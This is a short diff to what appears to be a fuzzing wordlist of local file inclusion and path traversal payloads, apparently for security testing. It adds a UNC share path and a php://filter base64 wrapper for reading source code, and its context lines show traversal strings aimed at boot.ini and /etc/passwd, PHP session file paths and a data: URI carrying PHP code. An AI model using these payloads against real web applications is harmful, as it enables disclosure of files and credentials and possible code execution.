@@ -9,6 +9,7 @@ c:\boot.ini
 \\?\c:./././boot.ini
 \\?\c:./././../../boot.ini
 \\?\UNC\Server\Volume\boot.ini
+\\share\some\file.dat
 c:/boot.ini
 c:/././././boot.ini
 c:/../../../boot.ini
@@ -31,6 +32,7 @@ c:/../../../boot.ini
 /etc/passwd/./././
 php://input
 data:,<? echo "yay"; ?>
+php://filter/convert.base64-encode/resource=index.php
 /tmp/sess_012345678
 /wamp/tmp/sess_012345678
 /var/lib/php5/sess_012345678
